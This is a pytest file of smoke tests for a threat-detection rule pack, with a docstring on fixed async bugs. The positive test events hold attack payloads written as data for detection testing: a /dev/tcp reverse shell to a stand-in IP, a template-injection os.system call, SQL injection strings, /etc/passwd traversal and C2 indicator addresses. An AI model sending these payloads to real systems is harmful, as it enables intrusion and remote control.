"""Detection-rule smoke tests for the threat-intel rule pack (26 rules, Jun 2026).

These 52 tests never executed. They called `correlation_engine.evaluate()`
without awaiting it -- `evaluate` is `async def`, so `matches` was a coroutine
and every test died on `TypeError: 'coroutine' object is not iterable` at the
list comprehension. They then read the result with `getattr(m, "rule_id")`,
but evaluate() returns rule DICTS, so even once awaited every assertion would
have compared against a list of None. Two bugs stacked, and because the file
was collected but always errored, the pack it covers went unverified for its
whole life.

Renamed from test_correlation_engine_v163.py: the version stamp was three
releases stale and said nothing about what the file tests.
"""
import pytest

from app.services.correlation_engine import correlation_engine


def _rule_id(match):
    """evaluate() yields rule dicts; tolerate objects in case that changes."""
    if isinstance(match, dict):
        return match.get("id")
    return getattr(match, "rule_id", None) or getattr(match, "id", None)


@pytest.fixture(autouse=True)
def _reset_cooldowns():
    """Rules carry a per-(rule, group) cooldown. These tests reuse source IPs
    across cases, so without a reset an earlier test suppresses a later one and
    the failure looks like a broken rule rather than shared state."""
    correlation_engine._fired.clear()
    yield
    correlation_engine._fired.clear()



async def test_sigma_web_jce_joomla_rce_positive():
    # count_threshold is 2 within 10s, so one request is correctly ignored.
    # The original test sent a single request and would have failed even once
    # awaited -- it asserted a rate rule behaves like a signature rule.
    evt = {'event_type': 'web_request', 'source_ip': '203.0.113.10', 'path': '/index.php?option=com_jce&task=profiles.import', 'method': 'POST'}
    await correlation_engine.evaluate(dict(evt))
    matches = await correlation_engine.evaluate(dict(evt))
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_jce_joomla_rce" in rule_ids, f"expected sigma_web_jce_joomla_rce to match, got {rule_ids}"

async def test_sigma_web_jce_joomla_rce_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.10', 'path': '/index.php?option=com_content&view=article&id=1', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_jce_joomla_rce" not in rule_ids, f"sigma_web_jce_joomla_rce false-positived on benign event"

async def test_sigma_web_mirasvit_cachewarmer_deser_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.11', 'path': '/checkout/cart Cookie: CacheWarmer=TzO0NTpcyM2', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_mirasvit_cachewarmer_deser" in rule_ids, f"expected sigma_web_mirasvit_cachewarmer_deser to match, got {rule_ids}"

async def test_sigma_web_mirasvit_cachewarmer_deser_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.11', 'path': '/checkout/cart Cookie: PHPSESSID=abc123', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_mirasvit_cachewarmer_deser" not in rule_ids, f"sigma_web_mirasvit_cachewarmer_deser false-positived on benign event"

async def test_sigma_web_ivanti_sentry_cmdinject_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.12', 'path': '/mics/api/v2/sentry/mics-config/handleMessage?cmd=commandexec', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_ivanti_sentry_cmdinject" in rule_ids, f"expected sigma_web_ivanti_sentry_cmdinject to match, got {rule_ids}"

async def test_sigma_web_ivanti_sentry_cmdinject_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.12', 'path': '/mics/api/v2/sentry/status', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_ivanti_sentry_cmdinject" not in rule_ids, f"sigma_web_ivanti_sentry_cmdinject false-positived on benign event"

async def test_sigma_ai_litellm_mcp_cmdinject_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.13', 'path': '/mcp-rest/test/connection {"transport":"stdio","command":"sh"}', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ai_litellm_mcp_cmdinject" in rule_ids, f"expected sigma_ai_litellm_mcp_cmdinject to match, got {rule_ids}"

async def test_sigma_ai_litellm_mcp_cmdinject_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.13', 'path': '/mcp-rest/test/connection {"transport":"sse"}', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ai_litellm_mcp_cmdinject" not in rule_ids, f"sigma_ai_litellm_mcp_cmdinject false-positived on benign event"

async def test_sigma_web_splunk_postgres_recovery_rce_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.14', 'path': '/en-US/splunkd/__raw/v1/postgres/recovery/backup', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_splunk_postgres_recovery_rce" in rule_ids, f"expected sigma_web_splunk_postgres_recovery_rce to match, got {rule_ids}"

async def test_sigma_web_splunk_postgres_recovery_rce_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.14', 'path': '/en-US/splunkd/__raw/v1/data/inputs', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_splunk_postgres_recovery_rce" not in rule_ids, f"sigma_web_splunk_postgres_recovery_rce false-positived on benign event"

async def test_sigma_ai_marimo_terminal_rce_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.15', 'path': '/terminal/ws', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ai_marimo_terminal_rce" in rule_ids, f"expected sigma_ai_marimo_terminal_rce to match, got {rule_ids}"

async def test_sigma_ai_marimo_terminal_rce_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.15', 'path': '/notebook/ws', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ai_marimo_terminal_rce" not in rule_ids, f"sigma_ai_marimo_terminal_rce false-positived on benign event"

async def test_sigma_ai_sglang_rerank_ssti_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.16', 'path': "/v1/rerank {{__import__('os').system('id')}}", 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ai_sglang_rerank_ssti" in rule_ids, f"expected sigma_ai_sglang_rerank_ssti to match, got {rule_ids}"

async def test_sigma_ai_sglang_rerank_ssti_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.16', 'path': '/v1/rerank {"query":"hello","documents":["doc1"]}', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ai_sglang_rerank_ssti" not in rule_ids, f"sigma_ai_sglang_rerank_ssti false-positived on benign event"

async def test_sigma_supply_mastra_easyday_c2_positive():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.5', 'destination_ip': '23.254.164.92', 'destination_port': 8000})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_mastra_easyday_c2" in rule_ids, f"expected sigma_supply_mastra_easyday_c2 to match, got {rule_ids}"

async def test_sigma_supply_mastra_easyday_c2_negative():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.5', 'destination_ip': '1.1.1.1', 'destination_port': 443})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_mastra_easyday_c2" not in rule_ids, f"sigma_supply_mastra_easyday_c2 false-positived on benign event"

async def test_sigma_supply_nodeipc_azure_c2_positive():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.6', 'destination_ip': '37.16.75.69', 'destination_port': 443})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_nodeipc_azure_c2" in rule_ids, f"expected sigma_supply_nodeipc_azure_c2 to match, got {rule_ids}"

async def test_sigma_supply_nodeipc_azure_c2_negative():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.6', 'destination_ip': '13.107.42.14', 'destination_port': 443})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_nodeipc_azure_c2" not in rule_ids, f"sigma_supply_nodeipc_azure_c2 false-positived on benign event"

async def test_sigma_supply_shai_hulud_miasma_anthropic_spoof_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.7', 'path': 'POST api.anthropic.com/v1/api', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_shai_hulud_miasma_anthropic_spoof" in rule_ids, f"expected sigma_supply_shai_hulud_miasma_anthropic_spoof to match, got {rule_ids}"

async def test_sigma_supply_shai_hulud_miasma_anthropic_spoof_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.7', 'path': 'POST api.anthropic.com/v1/messages', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_shai_hulud_miasma_anthropic_spoof" not in rule_ids, f"sigma_supply_shai_hulud_miasma_anthropic_spoof false-positived on benign event"

async def test_sigma_supply_solana_fakefix_telegram_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.8', 'path': 'POST api.telegram.org/bot12345:ABC/sendMessage', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_solana_fakefix_telegram" in rule_ids, f"expected sigma_supply_solana_fakefix_telegram to match, got {rule_ids}"

async def test_sigma_supply_solana_fakefix_telegram_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.8', 'path': 'GET api.github.com/repos/user/repo', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_solana_fakefix_telegram" not in rule_ids, f"sigma_supply_solana_fakefix_telegram false-positived on benign event"

async def test_sigma_network_fortibleed_ioc_positive():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '85.11.187.8', 'destination_ip': '100.64.0.10', 'destination_port': 443})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_network_fortibleed_ioc" in rule_ids, f"expected sigma_network_fortibleed_ioc to match, got {rule_ids}"

async def test_sigma_network_fortibleed_ioc_negative():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '200.1.1.1', 'destination_ip': '100.64.0.10', 'destination_port': 443})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_network_fortibleed_ioc" not in rule_ids, f"sigma_network_fortibleed_ioc false-positived on benign event"

async def test_sigma_ai_litellm_bearer_sqli_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.17', 'path': "/chat/completions Authorization: Bearer abc'OR'1'='1", 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ai_litellm_bearer_sqli" in rule_ids, f"expected sigma_ai_litellm_bearer_sqli to match, got {rule_ids}"

async def test_sigma_ai_litellm_bearer_sqli_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.17', 'path': '/chat/completions Authorization: Bearer sk-abc123validtoken', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ai_litellm_bearer_sqli" not in rule_ids, f"sigma_ai_litellm_bearer_sqli false-positived on benign event"

async def test_sigma_web_nextjs_ws_ssrf_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.18', 'path': 'GET http://internal.local/admin Upgrade: websocket', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_nextjs_ws_ssrf" in rule_ids, f"expected sigma_web_nextjs_ws_ssrf to match, got {rule_ids}"

async def test_sigma_web_nextjs_ws_ssrf_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.18', 'path': '/api/users', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_nextjs_ws_ssrf" not in rule_ids, f"sigma_web_nextjs_ws_ssrf false-positived on benign event"

async def test_sigma_web_ghost_content_api_sqli_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.19', 'path': '/ghost/api/v3/content/posts?filter=slug:[UNION SELECT 1,2,3--]', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_ghost_content_api_sqli" in rule_ids, f"expected sigma_web_ghost_content_api_sqli to match, got {rule_ids}"

async def test_sigma_web_ghost_content_api_sqli_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.19', 'path': '/ghost/api/v3/content/posts?filter=tag:news', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_ghost_content_api_sqli" not in rule_ids, f"sigma_web_ghost_content_api_sqli false-positived on benign event"

async def test_sigma_supply_shai_hulud_hades_firedalazer_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.9', 'path': 'github.com/search/commits?q=firedalazer', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_shai_hulud_hades_firedalazer" in rule_ids, f"expected sigma_supply_shai_hulud_hades_firedalazer to match, got {rule_ids}"

async def test_sigma_supply_shai_hulud_hades_firedalazer_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '10.0.0.9', 'path': 'github.com/search/commits?q=fix+bug', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_shai_hulud_hades_firedalazer" not in rule_ids, f"sigma_supply_shai_hulud_hades_firedalazer false-positived on benign event"

async def test_sigma_ransomware_prinz_eugen_ext_positive():
    matches = await correlation_engine.evaluate({'event_type': 'file_creation', 'source_ip': '10.0.0.10', 'path': '/home/user/Documents/report.docx.prinzeugen'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ransomware_prinz_eugen_ext" in rule_ids, f"expected sigma_ransomware_prinz_eugen_ext to match, got {rule_ids}"

async def test_sigma_ransomware_prinz_eugen_ext_negative():
    matches = await correlation_engine.evaluate({'event_type': 'file_creation', 'source_ip': '10.0.0.10', 'path': '/home/user/Documents/report.docx'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ransomware_prinz_eugen_ext" not in rule_ids, f"sigma_ransomware_prinz_eugen_ext false-positived on benign event"

async def test_sigma_ransomware_shinysp1d3r_ext_positive():
    matches = await correlation_engine.evaluate({'event_type': 'file_creation', 'source_ip': '10.0.0.11', 'path': '/vmfs/volumes/datastore1/vm.vmdk.shinysp1d3r'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ransomware_shinysp1d3r_ext" in rule_ids, f"expected sigma_ransomware_shinysp1d3r_ext to match, got {rule_ids}"

async def test_sigma_ransomware_shinysp1d3r_ext_negative():
    matches = await correlation_engine.evaluate({'event_type': 'file_creation', 'source_ip': '10.0.0.11', 'path': '/vmfs/volumes/datastore1/vm.vmdk'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_ransomware_shinysp1d3r_ext" not in rule_ids, f"sigma_ransomware_shinysp1d3r_ext false-positived on benign event"

async def test_sigma_web_schneider_saitel_path_traversal_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.20', 'path': '/saitel/config/../../../etc/passwd', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_schneider_saitel_path_traversal" in rule_ids, f"expected sigma_web_schneider_saitel_path_traversal to match, got {rule_ids}"

async def test_sigma_web_schneider_saitel_path_traversal_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.20', 'path': '/saitel/status', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_schneider_saitel_path_traversal" not in rule_ids, f"sigma_web_schneider_saitel_path_traversal false-positived on benign event"

async def test_sigma_web_aver_ptc_cgi_rce_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.21', 'path': '/cgi-bin/upload.cgi?cmd=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_aver_ptc_cgi_rce" in rule_ids, f"expected sigma_web_aver_ptc_cgi_rce to match, got {rule_ids}"

async def test_sigma_web_aver_ptc_cgi_rce_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.21', 'path': '/cgi-bin/status.cgi', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_aver_ptc_cgi_rce" not in rule_ids, f"sigma_web_aver_ptc_cgi_rce false-positived on benign event"

async def test_sigma_web_panos_globalprotect_bypass_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.22', 'path': '/ssl-vpn/hipreport.esp', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_panos_globalprotect_bypass" in rule_ids, f"expected sigma_web_panos_globalprotect_bypass to match, got {rule_ids}"

async def test_sigma_web_panos_globalprotect_bypass_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.22', 'path': '/global-protect/login.esp', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_panos_globalprotect_bypass" not in rule_ids, f"sigma_web_panos_globalprotect_bypass false-positived on benign event"

async def test_sigma_network_checkpoint_qilin_c2_positive():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '45.77.149.152', 'destination_ip': '100.64.0.10', 'destination_port': 500})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_network_checkpoint_qilin_c2" in rule_ids, f"expected sigma_network_checkpoint_qilin_c2 to match, got {rule_ids}"

async def test_sigma_network_checkpoint_qilin_c2_negative():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '1.2.3.4', 'destination_ip': '100.64.0.10', 'destination_port': 500})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_network_checkpoint_qilin_c2" not in rule_ids, f"sigma_network_checkpoint_qilin_c2 false-positived on benign event"

async def test_sigma_network_ayysshush_asus_c2_positive():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '101.99.91.151', 'destination_ip': '100.64.0.10', 'destination_port': 22})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_network_ayysshush_asus_c2" in rule_ids, f"expected sigma_network_ayysshush_asus_c2 to match, got {rule_ids}"

async def test_sigma_network_ayysshush_asus_c2_negative():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '8.8.8.8', 'destination_ip': '100.64.0.10', 'destination_port': 22})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_network_ayysshush_asus_c2" not in rule_ids, f"sigma_network_ayysshush_asus_c2 false-positived on benign event"

async def test_sigma_supply_axios_sfrclak_c2_positive():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.12', 'destination_ip': '142.11.206.73', 'destination_port': 8000})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_axios_sfrclak_c2" in rule_ids, f"expected sigma_supply_axios_sfrclak_c2 to match, got {rule_ids}"

async def test_sigma_supply_axios_sfrclak_c2_negative():
    matches = await correlation_engine.evaluate({'event_type': 'network_connection', 'source_ip': '10.0.0.12', 'destination_ip': '104.16.0.1', 'destination_port': 443})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_supply_axios_sfrclak_c2" not in rule_ids, f"sigma_supply_axios_sfrclak_c2 false-positived on benign event"

async def test_sigma_web_cpanel_whm_crlf_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.23', 'path': '/login Cookie: whostmgrsession=abc\\r\\nSet-Cookie: evil=1', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_cpanel_whm_crlf" in rule_ids, f"expected sigma_web_cpanel_whm_crlf to match, got {rule_ids}"

async def test_sigma_web_cpanel_whm_crlf_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.23', 'path': '/login Cookie: whostmgrsession=abc123def456', 'method': 'POST'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_cpanel_whm_crlf" not in rule_ids, f"sigma_web_cpanel_whm_crlf false-positived on benign event"

async def test_sigma_web_drupal_jsonapi_sqli_positive():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.24', 'path': '/jsonapi/node/article?filter[title]=UNION SELECT pg_sleep(5)', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_drupal_jsonapi_sqli" in rule_ids, f"expected sigma_web_drupal_jsonapi_sqli to match, got {rule_ids}"

async def test_sigma_web_drupal_jsonapi_sqli_negative():
    matches = await correlation_engine.evaluate({'event_type': 'web_request', 'source_ip': '203.0.113.24', 'path': '/jsonapi/node/article?filter[title]=hello-world', 'method': 'GET'})
    rule_ids = [_rule_id(m) for m in matches]
    assert "sigma_web_drupal_jsonapi_sqli" not in rule_ids, f"sigma_web_drupal_jsonapi_sqli false-positived on benign event"
